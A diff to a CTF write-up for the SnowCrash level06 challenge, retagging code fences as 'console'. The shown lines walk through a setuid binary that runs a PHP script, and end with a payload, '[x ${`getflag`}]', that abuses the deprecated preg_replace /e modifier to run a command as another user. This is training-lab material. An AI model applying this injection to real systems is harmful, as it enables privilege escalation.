@@ -7,7 +7,7 @@
 - We have executions right on both files.
 - The SETUID bit of `flag06` is set.
 
-```
+```console
 level06@SnowCrash:~$ pwd
 /home/user/level06
 level06@SnowCrash:~$ ls -al
@@ -38,7 +38,7 @@ other::---
 
 - Based on strings found in the binary, we may suppose that `level06` will allow us to run `level06.php` as `flag06`.
 
-```
+```console
 level06@SnowCrash:~$ strings -a level06
                     ...
 strdup
@@ -84,7 +84,7 @@ $r = x($argv[1], $argv[2]); print $r;
 - One of them is able to execute the parsed content (the /e option).
 - Notice that this option is deprecated but the PHP version (5.3.10) on SnowCrash in old enough to allow it.
 
-```sh
+```console
 level06@SnowCrash:~$ php -v
 PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
 Copyright (c) 1997-2012 The PHP Group
@@ -100,7 +100,7 @@ Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
 
 ## Misuse of PHP
 
-```sh
+```console
 level06@SnowCrash:~$ chmod 777 .
 level06@SnowCrash:~$ echo '[x ${`getflag`}]' > irregex
 level06@SnowCrash:~$ ./level06 irregex
